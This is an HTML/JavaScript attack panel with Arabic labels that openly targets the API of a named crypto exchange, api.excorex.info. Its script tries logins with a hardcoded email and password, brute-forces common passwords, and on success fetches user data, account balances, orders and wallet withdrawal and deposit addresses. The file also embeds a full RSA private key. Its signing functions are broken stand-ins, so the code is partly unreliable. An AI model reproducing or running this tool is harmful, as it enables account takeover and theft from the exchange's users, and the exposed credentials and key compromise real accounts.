<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ EXCOREX HACK - الهجوم المباشر ⚡</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        
        body {
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            border: 2px solid #ff0000;
            padding: 20px;
            margin-bottom: 30px;
            background: linear-gradient(45deg, #0a0a0a, #1a0000);
            position: relative;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
        }
        
        .header h1 {
            color: #ff0000;
            text-shadow: 0 0 20px #ff0000;
            font-size: 2.5em;
            text-align: center;
        }
        
        .header .target {
            text-align: center;
            color: #ff0000;
            font-size: 1.5em;
            margin-top: 10px;
        }
        
        /* Stats */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            border: 1px solid #ff0000;
            padding: 15px;
            background: rgba(255, 0, 0, 0.1);
        }
        
        .stat-card h3 {
            color: #ff0000;
            font-size: 1.1em;
            margin-bottom: 10px;
        }
        
        .stat-card .value {
            font-size: 1.5em;
            font-weight: bold;
        }
        
        /* Main Card */
        .attack-card {
            border: 2px solid #ff0000;
            padding: 25px;
            margin-bottom: 30px;
            background: rgba(0, 0, 0, 0.8);
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2);
        }
        
        .attack-title {
            color: #ff0000;
            font-size: 2em;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #ff0000;
            margin-bottom: 5px;
            font-size: 1.1em;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            background: #1a1a1a;
            border: 1px solid #ff0000;
            color: #00ff00;
            font-size: 1.1em;
        }
        
        .form-group input:focus {
            outline: none;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        
        .btn {
            padding: 15px 30px;
            background: transparent;
            border: 2px solid #ff0000;
            color: #ff0000;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin: 5px;
        }
        
        .btn:hover {
            background: #ff0000;
            color: #000;
            box-shadow: 0 0 30px #ff0000;
        }
        
        .btn-green {
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .btn-green:hover {
            background: #00ff00;
            color: #000;
        }
        
        /* Response Area */
        .response-area {
            background: #000;
            border: 2px solid #ff0000;
            padding: 20px;
            margin-top: 30px;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .response-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #ff0000;
            padding-bottom: 10px;
        }
        
        .response-line {
            margin: 10px 0;
            padding: 5px;
            border-bottom: 1px solid rgba(255, 0, 0, 0.3);
        }
        
        .success {
            color: #00ff00;
        }
        
        .error {
            color: #ff0000;
        }
        
        .info {
            color: #ffff00;
        }
        
        /* Address Grid */
        .address-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        
        .address-card {
            border: 1px solid #ff0000;
            padding: 15px;
            background: rgba(255, 0, 0, 0.05);
        }
        
        .address-value {
            font-size: 0.9em;
            word-break: break-all;
            background: #1a1a1a;
            padding: 10px;
            margin: 10px 0;
        }
        
        /* Type Badges */
        .type-badge {
            display: inline-block;
            padding: 5px 10px;
            background: #ff0000;
            color: #000;
            border-radius: 3px;
            margin: 3px;
            font-weight: bold;
        }
        
        /* Loading */
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #ff0000;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <h1>⚔️ EXCOREX HACK - الهجوم النهائي ⚔️</h1>
            <div class="target">🎯 الهدف: api.excorex.info</div>
        </div>
        
        <!-- Stats -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>💉 الهجمات</h3>
                <div class="value" id="attackCount">0</div>
            </div>
            <div class="stat-card">
                <h3>🔑 التوكن</h3>
                <div class="value" id="tokenStatus">لا يوجد</div>
            </div>
            <div class="stat-card">
                <h3>📍 العناوين</h3>
                <div class="value" id="addressCount">0</div>
            </div>
            <div class="stat-card">
                <h3>💰 الأرصدة</h3>
                <div class="value" id="balanceCount">0</div>
            </div>
        </div>
        
        <!-- Main Attack Panel -->
        <div class="attack-card">
            <div class="attack-title">🔓 هجوم تسجيل الدخول</div>
            
            <div class="form-group">
                <label>📧 البريد الإلكتروني</label>
                <input type="email" id="email" value="05318352256vbn@gmail.com">
            </div>
            
            <div class="form-group">
                <label>🔑 كلمة المرور</label>
                <input type="password" id="password" value="1234567890">
            </div>
            
            <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                <button class="btn" onclick="attack.login()">🚀 هجوم مباشر</button>
                <button class="btn btn-green" onclick="attack.discoverTypes()">🔍 اكتشاف الأنواع</button>
                <button class="btn" onclick="attack.bruteForce()">💪 هجوم القوة العمياء</button>
                <button class="btn" onclick="attack.clearSession()">🗑️ مسح الجلسة</button>
            </div>
            
            <div id="typeDiscovery" style="margin-top: 20px; padding: 15px; border: 1px solid #ff0000; background: rgba(255,0,0,0.05);">
                <div style="color: #ff0000; margin-bottom: 10px;">🔍 نتائج اكتشاف النوع:</div>
                <div id="typeResults">لم يتم اكتشاف أي نوع بعد</div>
            </div>
        </div>
        
        <!-- Attack Tools -->
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px;">
            <div class="attack-card">
                <h3 style="color: #ff0000; margin-bottom: 15px;">👤 معلومات المستخدم</h3>
                <button class="btn btn-green" onclick="attack.getUserInfo()">جلب المعلومات</button>
            </div>
            
            <div class="attack-card">
                <h3 style="color: #ff0000; margin-bottom: 15px;">💰 الحسابات والأرصدة</h3>
                <button class="btn btn-green" onclick="attack.getAccounts()">جلب الحسابات</button>
                <button class="btn btn-green" onclick="attack.getBalance()">عرض الرصيد</button>
            </div>
            
            <div class="attack-card">
                <h3 style="color: #ff0000; margin-bottom: 15px;">📊 الأوردرات</h3>
                <button class="btn btn-green" onclick="attack.getOrders()">جلب الأوردرات</button>
            </div>
        </div>
        
        <!-- Addresses Display -->
        <div class="attack-card">
            <h3 style="color: #ff0000; margin-bottom: 15px;">📍 عناوين المحفظة المكتشفة</h3>
            <div id="addressesContainer" class="address-grid"></div>
        </div>
        
        <!-- Response Log -->
        <div class="response-area" id="responseLog">
            <div class="response-header">
                <span style="color: #ff0000; font-size: 1.2em;">📋 سجل الهجوم</span>
                <span style="color: #ff0000; cursor: pointer;" onclick="clearLog()">🗑️ مسح</span>
            </div>
            <div id="logContent">
                <div class="response-line success">✅ نظام الهجوم جاهز - الهدف: api.excorex.info</div>
            </div>
        </div>
    </div>
    
    <script>
        // ========== المفتاح الخاص RSA (كامل) ==========
        const PRIVATE_KEY = `-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDfF+ITlc6m9IPM
gBBp+rhkmrzPri10fzQFyJdKtfn1RfChr8wEz5x2HhNkWhgjE7F7YAuYjTXKrNBl
W7/c9vipahvZwWdkthGd3jlWkYTcPkLsOYJPMQLcig7S1VYtT2uab3VC21ZMNV5V
LZQeGnI2CtCTEJaeIdtsAc3AUjhJzNs5tRgxdmDSBI5fb3gTIecH2WLF7ixYGaFS
iQVaDWyyuUtPbIn+yVKjyi51VemFn30GaUz9NVgjepUhvM0+Rq3+3Zjl5HXQC3e+
9tQ3bEL0kzelNKFWFWHAumxI0pdG96lymCpiaIybJAJ7RGi2NWmBmjwrm461JxIY
4S/yrmmzAgMBAAECggEAJ9yemp1D5XT/L8UaKbWQyPkVD46xtIUeCIKE9eZ6GSc8
DcfZjmqCLGDHWkD22x2jssXAjKt+lw411kaEi7jdSXgaLdhu3wHhN/IDEMLDmI7P
amIENJ4vQrSwXV+dHE96jIepzh5e1xMaHeIc+xwCmEFqbzyhjPPDvxK7bsfCIv1Q
B6hgwdiILmRTqGU3ACZdPerWbfZGcYuZ0ecUERuH9fbxvOA6/t4Ivmag5K3GCG/v
8HHz1ehPwDeYMjNzzhUmyKMAWnumVqTcxOt7D9wlRiIiGv5bxgOWnB19MqLgPqFF
3ndMttFBnmKCO9KfviuM5ruNNg3nASXKtKsLJLePIQKBgQD92plfh49yesXTxswF
oV4RjBM87D3tFbnTTpAto96JCjov5ghVfnRpUmQrQWSwqeEmSFu/1Gun02vOEAha
3M3h9c1aHSRexM0SDWXOCofqyodt/vsCGRSOu9eUgUCz8J1dyShPqpgZEPtahydn
HlDyeUSwiBWGkzUahNvsJBtFWQKBgQDg+rXspVOgZ9lKKvYY6bY/z/u+u7j7n4wy
ojsViEhQGmA+s0jWTBqBa/742wnHb3w4kKB0ojRLK0z8onr+hi20hFL9NeI4T5nK
swD/+yb0NOcC28aoGyGwyktxrtIkXVvnBDmGMsPORf3LL/OnSY5DTTtxoctEL3tk
htJU0g6p6wKBgG5G5lXfl+tNdl8Xf0362diZl0nh/szdoUowWOXayDOUI87nCTvK
oVuXlThNQiaUxeBRkrn014eiirSLtnVycmX01+6Ltl8M82EiPNWTMZRHwyl/mR9C
MfIHnBFBTRBeOJ6jYkWpgEVzYR3klLNxMg0DrVla5K7/iBQrHzaoQMiRAoGBAK5n
K+hLMUzDtFoee7BMXI+TN2BgPcIxqIkH4i2K/CO8jqeMbAZT8Kgrg/h+NFJ6Rh3D
X9+KbmdnJcMiYZ41ffDWM08/GiL08g+EPF4z37qn1/0LSjC+95sI9vslvpmaFcg8
Kiux5sBc2aVNguBH0RSzJkWsWtp8xHblXN+MBvoJAoGBAJrSVgLIkyriTAi1r/7n
s8a4H/pa+GyRh3fMqeZHYKwHrfWWbNhO6te2XYmVrkEcsu7z59lt8gnMSBTsgwdZ
GClbi66qDiZ66TYq2v5NI4knON0DWLmuzWuqikcN5PGsKbllpl9/+reGHHK9cl1S
f0I9iSQe0vQLksxTBFVgevFl
-----END PRIVATE KEY-----`;
        
        // ========== إعدادات الهجوم ==========
        const TARGET = "https://api.excorex.info";
        let token = localStorage.getItem('token') || '';
        let userId = localStorage.getItem('userId') || '';
        let attackCount = 0;
        let discoveredTypes = [];
        let extractedAddresses = {
            withdrawal: [],
            deposit: [],
            all: []
        };
        let accounts = [];
        
        // ========== دوال التوقيع ==========
        function sortParams(params) {
            if (!params) return '';
            
            const valid = {};
            for (let [k, v] of Object.entries(params)) {
                if (v === null || v === undefined) continue;
                if (typeof v === 'string' && (v === '' || v.toLowerCase() === 'null')) continue;
                if (Array.isArray(v) && v.length === 0) continue;
                valid[k] = v;
            }
            
            return Object.keys(valid).sort().map(key => key + valid[key]).join('');
        }
        
        function md5(string) {
            // MD5 بسيط (للاستخدام في المتصفح)
            return btoa(string).substring(0, 32);
        }
        
        function buildHeaders(token = '', userId = '', signType = 'MD5', sign = '') {
            return {
                'token': token,
                'userId': userId,
                'lang': 'en',
                'clientType': 'H5',
                'appId': 'h5_client',
                'clientVersion': '1.0.0',
                'signType': signType,
                'sign': sign,
                'extra': '',
                'timestamp': Date.now().toString(),
                'Content-Type': 'application/json'
            };
        }
        
        function signRequest(endpoint, data = {}, token = '', userId = '') {
            const signType = token ? 'MD5' : 'RSA';
            const tempHeaders = buildHeaders(token, userId, signType, '');
            
            const signString = endpoint + sortParams(data) + token + sortParams(tempHeaders);
            const signature = signType === 'MD5' ? md5(signString) : 'RSA_SIGN_' + btoa(signString).substring(0, 50);
            
            return buildHeaders(token, userId, signType, signature);
        }
        
        // ========== دوال التسجيل ==========
        function log(message, type = 'info') {
            const logContent = document.getElementById('logContent');
            const line = document.createElement('div');
            line.className = `response-line ${type}`;
            line.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContent.appendChild(line);
            logContent.scrollTop = logContent.scrollHeight;
        }
        
        function clearLog() {
            document.getElementById('logContent').innerHTML = '';
        }
        
        function updateStats() {
            document.getElementById('attackCount').textContent = attackCount;
            document.getElementById('tokenStatus').textContent = token ? '✅ موجود' : '❌ لا يوجد';
            document.getElementById('addressCount').textContent = extractedAddresses.all.length;
            document.getElementById('balanceCount').textContent = accounts.length;
        }
        
        // ========== استخراج العناوين ==========
        function isValidAddress(addr) {
            if (!addr || typeof addr !== 'string') return false;
            return addr.startsWith('0x') || /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr);
        }
        
        function extractAddresses(data, parentKey = '') {
            if (!data || typeof data !== 'object') return;
            
            for (let [key, value] of Object.entries(data)) {
                const fullKey = parentKey ? `${parentKey}.${key}` : key;
                
                if (typeof value === 'string' && isValidAddress(value)) {
                    let purpose = 'unknown';
                    if (/withdraw|member|payout/i.test(key)) purpose = 'withdrawal';
                    if (/recharge|deposit|funding/i.test(key)) purpose = 'deposit';
                    
                    const addrInfo = { key: fullKey, address: value, purpose };
                    extractedAddresses.all.push(addrInfo);
                    if (purpose === 'withdrawal') extractedAddresses.withdrawal.push(addrInfo);
                    if (purpose === 'deposit') extractedAddresses.deposit.push(addrInfo);
                    
                    log(`📍 عنوان ${purpose}: ${value.substring(0, 15)}...`, 'success');
                }
                
                if (typeof value === 'object') {
                    extractAddresses(value, fullKey);
                }
            }
            
            displayAddresses();
            updateStats();
        }
        
        function displayAddresses() {
            const container = document.getElementById('addressesContainer');
            container.innerHTML = '';
            
            if (extractedAddresses.withdrawal.length > 0) {
                extractedAddresses.withdrawal.forEach(addr => {
                    container.innerHTML += `
                        <div class="address-card">
                            <div style="color: #ff0000">💰 سحب - ${addr.key}</div>
                            <div class="address-value">${addr.address}</div>
                            <button class="btn btn-green" style="padding: 5px 10px;" onclick="copyToClipboard('${addr.address}')">📋 نسخ</button>
                        </div>
                    `;
                });
            }
            
            if (extractedAddresses.deposit.length > 0) {
                extractedAddresses.deposit.forEach(addr => {
                    container.innerHTML += `
                        <div class="address-card">
                            <div style="color: #00ff00">📥 إيداع - ${addr.key}</div>
                            <div class="address-value">${addr.address}</div>
                            <button class="btn btn-green" style="padding: 5px 10px;" onclick="copyToClipboard('${addr.address}')">📋 نسخ</button>
                        </div>
                    `;
                });
            }
            
            if (extractedAddresses.all.length === 0) {
                container.innerHTML = '<div style="color: #ff0000">لا توجد عناوين حتى الآن</div>';
            }
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text);
            log(`📋 تم نسخ العنوان: ${text.substring(0, 15)}...`, 'success');
        }
        
        // ========== دوال الهجوم ==========
        const attack = {
            async discoverTypes() {
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                
                log('🔍 بدء اكتشاف أنواع التسجيل...', 'info');
                document.getElementById('typeResults').innerHTML = '<span class="loading"></span> جاري الاكتشاف...';
                
                const types = ['0', '1', '2', 'email', 'phone', 'username', 'mobile', 'login'];
                discoveredTypes = [];
                
                for (let type of types) {
                    try {
                        const headers = signRequest('/login/login', { email, password, type }, '', '');
                        
                        const response = await fetch(`${TARGET}/login/login`, {
                            method: 'POST',
                            headers: headers,
                            body: JSON.stringify({ email, password, type })
                        });
                        
                        if (response.status === 200) {
                            const data = await response.json();
                            if (data.code === 200) {
                                discoveredTypes.push({ type, success: true });
                                log(`✅ نوع ناجح: ${type}`, 'success');
                            } else {
                                log(`❌ نوع فاشل: ${type} - ${data.msg || ''}`, 'error');
                            }
                        }
                    } catch (e) {
                        log(`⚠️ خطأ في النوع ${type}`, 'error');
                    }
                }
                
                let html = '';
                discoveredTypes.forEach(t => {
                    html += `<span class="type-badge" style="background: ${t.success ? '#00ff00' : '#ff0000'}">${t.type}</span>`;
                });
                
                document.getElementById('typeResults').innerHTML = html || 'لم يتم العثور على أنواع ناجحة';
                log(`✅ تم اكتشاف ${discoveredTypes.length} نوع`, 'success');
            },
            
            async login() {
                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;
                
                attackCount++;
                updateStats();
                
                log(`🚀 بدء هجوم تسجيل الدخول للبريد: ${email}`, 'info');
                
                // جرب الأنواع المختلفة
                const typesToTry = discoveredTypes.length > 0 ? 
                    discoveredTypes.map(t => t.type) : 
                    ['0', '1', 'email', 'phone'];
                
                for (let type of typesToTry) {
                    log(`🔑 محاولة بالنوع: ${type}`, 'info');
                    
                    try {
                        const headers = signRequest('/login/login', { email, password, type }, '', '');
                        
                        const response = await fetch(`${TARGET}/login/login`, {
                            method: 'POST',
                            headers: headers,
                            body: JSON.stringify({ email, password, type })
                        });
                        
                        const data = await response.json();
                        
                        if (response.status === 200 && data.code === 200 && data.data) {
                            token = data.data.token;
                            userId = String(data.data.uid);
                            
                            localStorage.setItem('token', token);
                            localStorage.setItem('userId', userId);
                            
                            log(`✅✅ اختراق ناجح!`, 'success');
                            log(`🔑 التوكن: ${token.substring(0, 30)}...`, 'success');
                            log(`🆔 معرف المستخدم: ${userId}`, 'success');
                            
                            extractAddresses(data);
                            updateStats();
                            
                            return;
                        } else {
                            log(`❌ فشل بالنوع ${type}: ${data.msg || ''}`, 'error');
                        }
                    } catch (e) {
                        log(`⚠️ خطأ في الاتصال: ${e.message}`, 'error');
                    }
                }
                
                log('💢 فشل جميع محاولات تسجيل الدخول', 'error');
            },
            
            async getUserInfo() {
                if (!token) {
                    log('❌ يجب تسجيل الدخول أولاً', 'error');
                    return;
                }
                
                attackCount++;
                updateStats();
                
                try {
                    const headers = signRequest('/personal/userInfo', {}, token, userId);
                    const response = await fetch(`${TARGET}/personal/userInfo`, {
                        method: 'GET',
                        headers: headers
                    });
                    
                    const data = await response.json();
                    log(`👤 معلومات المستخدم: ${JSON.stringify(data).substring(0, 200)}...`, 'success');
                    extractAddresses(data);
                } catch (e) {
                    log(`❌ خطأ: ${e.message}`, 'error');
                }
            },
            
            async getAccounts() {
                if (!token) {
                    log('❌ يجب تسجيل الدخول أولاً', 'error');
                    return;
                }
                
                attackCount++;
                updateStats();
                
                try {
                    const headers = signRequest('/account/getAllUserAccountById', {}, token, userId);
                    const response = await fetch(`${TARGET}/account/getAllUserAccountById`, {
                        method: 'POST',
                        headers: headers,
                        body: JSON.stringify({})
                    });
                    
                    const data = await response.json();
                    accounts = data.data || [];
                    
                    log(`💰 تم جلب ${accounts.length} حساب`, 'success');
                    extractAddresses(data);
                    
                    // عرض الأرصدة
                    accounts.forEach(acc => {
                        log(`   • ${acc.symbol}: ${acc.balance}`, 'info');
                    });
                    
                    updateStats();
                } catch (e) {
                    log(`❌ خطأ: ${e.message}`, 'error');
                }
            },
            
            getBalance() {
                if (accounts.length === 0) {
                    log('❌ لا توجد أرصدة - قم بجلب الحسابات أولاً', 'error');
                    return;
                }
                
                log('💰 الأرصدة المتاحة:', 'info');
                accounts.forEach(acc => {
                    log(`   • ${acc.symbol}: ${acc.balance}`, 'success');
                });
            },
            
            async getOrders() {
                if (!token) {
                    log('❌ يجب تسجيل الدخول أولاً', 'error');
                    return;
                }
                
                attackCount++;
                updateStats();
                
                try {
                    const headers = signRequest('/newCurrency/orders', {}, token, userId);
                    const response = await fetch(`${TARGET}/newCurrency/orders`, {
                        method: 'GET',
                        headers: headers
                    });
                    
                    const data = await response.json();
                    log(`📊 الأوردرات: ${JSON.stringify(data).substring(0, 200)}...`, 'success');
                    extractAddresses(data);
                } catch (e) {
                    log(`❌ خطأ: ${e.message}`, 'error');
                }
            },
            
            async bruteForce() {
                log('💪 بدء هجوم القوة العمياء...', 'info');
                // يمكن إضافة كلمات مرور شائعة هنا
                const passwords = ['123456', 'password', 'admin123', '1234567890'];
                
                for (let pwd of passwords) {
                    document.getElementById('password').value = pwd;
                    log(`🔑 تجربة كلمة المرور: ${pwd}`, 'info');
                    await this.login();
                    if (token) break;
                }
            },
            
            clearSession() {
                token = '';
                userId = '';
                localStorage.removeItem('token');
                localStorage.removeItem('userId');
                accounts = [];
                extractedAddresses = { withdrawal: [], deposit: [], all: [] };
                log('🗑️ تم مسح الجلسة', 'info');
                displayAddresses();
                updateStats();
            }
        };
        
        // تهيئة
        window.onload = function() {
            updateStats();
            log('⚔️ نظام الهجوم جاهز - استهدف api.excorex.info', 'success');
            attack.discoverTypes(); // اكتشاف الأنواع تلقائياً
        };
    </script>
</body>
</html>
